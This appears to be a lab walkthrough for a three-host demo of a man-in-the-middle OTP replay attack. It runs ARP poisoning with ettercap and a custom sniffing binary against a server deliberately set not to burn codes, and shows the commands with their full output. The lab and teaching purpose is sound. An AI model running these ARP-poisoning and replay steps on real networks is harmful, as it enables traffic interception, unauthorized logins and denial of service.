
**NOTE:** _This assumes the setup instructions have been completed_

First, we start up the server on host 3:
```root@host3:~# ROCKET_ADDRESS=0.0.0.0 OTP_DO_NOT_BURN=1 ./server```

Then on the second host, we setup the man in the middle attack.
First we have to poison the arp tables of hosts 1 and 3 so that all the traffic gets routed to host 2.
```root@host2:~# ./spoof.sh```
This should generate output looking like this 
```
Starting ettercap....
spawn -ignore HUP ettercap -TM arp /10.4.9.1// /10.4.9.3//

ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team

Listening on:
  eth0 -> 52:54:00:44:04:22
	  10.4.9.2/255.0.0.0
	  fe80::5054:ff:fe44:422/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  33 plugins
  42 protocol dissectors
  57 ports monitored
20388 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

3 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 10.4.9.1 52:54:00:44:04:21

 GROUP 2 : 10.4.9.3 52:54:00:44:04:23
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

Ettercap startup finished - killing it
Enabling kernel ip forwarding...
net.ipv4.ip_forward = 1
ARP attack complete. Failure to restore ARP tables will result in a DoS
```
This uses `ettercap` to execute the poisoning attack. Due to a bug in `ettercap` however, it is unable to correctly forward TCP packets. To deal with this, we kill `ettercap` and then enable ip forwarding at the kernel level. Now that we have executed the poisoning attack, we are ready to sniff out the OTP code. Let's prepare the attack!
```root@host2:~# OTP_REPLAY_MODE=immediate ./attack```
The binary should indicate that it is listening for packets 

```
Starting capture...
Capture initialized.
Setting tcp filter...
Listening...
```

Now that we are sniffing traffic in our MiTM, let's run the client from the first host!

```root@host1:~# ./client 10.4.9.3```


Back on host two, we should see something like this.
```
Starting capture...
Capture initialized.
Setting tcp filter...
Listening...
Captured OTP: "3c7e515d1a05961441ef3f04db534db1"
Executing immediate replay attack
SUCESSS: Replay attack worked!
```

Also notice that on host 3, the server has received two authentication requests! 

```
🚀 Rocket has launched from http://0.0.0.0:8000
POST /auth application/json:
    => Matched: POST /auth (auth)
___________________
NEW AUTH REQUEST RECEIVED
Expected code: 1936
Decrypted code: 1936
Authentication successful.
    => Outcome: Success
    => Response succeeded.
POST /auth application/json:
    => Matched: POST /auth (auth)
___________________
NEW AUTH REQUEST RECEIVED
Expected code: 1936
Decrypted code: 1936
Authentication successful.
    => Outcome: Success
    => Response succeeded.   
```
One of these came from the legitimate client and the other came from our attacker. Note that we cannot actually know what the code is from the attacker as it is encrypted, but that doesn't matter! We can just replay the same bytes because the server doesn't burn the code. Now if the server burned codes, this attack would not work.
